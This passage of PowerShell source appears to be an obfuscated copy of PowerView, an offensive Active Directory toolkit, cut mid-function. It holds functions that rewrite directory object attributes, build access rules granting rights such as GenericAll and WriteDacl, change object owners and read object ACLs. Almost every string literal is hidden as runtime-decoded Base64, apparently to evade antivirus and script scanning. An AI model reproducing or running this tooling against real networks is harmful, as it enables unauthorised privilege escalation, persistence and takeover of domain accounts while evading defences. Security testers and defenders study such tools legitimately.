                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) $TempObject.ftimeCreated
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) $TempObject.ftimeDeleted
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) $TempObject.ftimeLastOriginatingChange
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) $TempObject.dwVersion
                        $Output | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) $TempObject.pszLastOriginatingDsaDN
                        $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        $Output
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$ObjectDN'"
                }
            }
        }
    }
}
function Set-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{'Raw' = $True}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        $RawObject = Get-DomainObject @SearcherArguments
        ForEach ($Object in $RawObject) {
            $Entry = $RawObject.GetDirectoryEntry()
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '$($RawObject.Properties.samaccountname)'"
                        $TypeName = $Entry.$PropertyName[0].GetType().name
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$PropertyName' for object '$($RawObject.Properties.samaccountname)'"
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($RawObject.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function ConvertFrom-LDAPLogonHours {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbgBjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )
            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }
            $LogonHours
        }
    }
    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }
        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
        $Output
    }
}
function New-ADObjectAccessControlEntry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,
        [Guid]
        $InheritedObjectType
    )
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            $PrincipalSearcherArguments = @{
                'Identity' = $PrincipalIdentity
                'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw "Unable to resolve principal: $PrincipalIdentity"
            }
            elseif($Principal.Count -gt 1) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5ACAAbQBhAHQAYwBoAGUAcwAgAG0AdQBsAHQAaQBwAGwAZQAgAEEARAAgAG8AYgBqAGUAYwB0AHMALAAgAGIAdQB0ACAAbwBuAGwAeQAgAG8AbgBlACAAaQBzACAAYQBsAGwAbwB3AGUAZAA=')))
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }
        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight
        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }
    Process {
        if($PSCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AGQAaQB0AFIAdQBsAGUAVAB5AHAAZQA=')))) {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
        else {
            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }
        }
    }
}
function Set-DomainObjectOwner {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
        }
    }
    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
            $RawObject = Get-DomainObject @SearcherArguments
            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByAA==')))
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning "[Set-DomainObjectOwner] Error setting owner: $_"
                }
            }
        }
    }
}
function Get-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        $Sacl,
        [Switch]
        $ResolveGUIDs,
        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $SearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))
        }
        else {
            $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
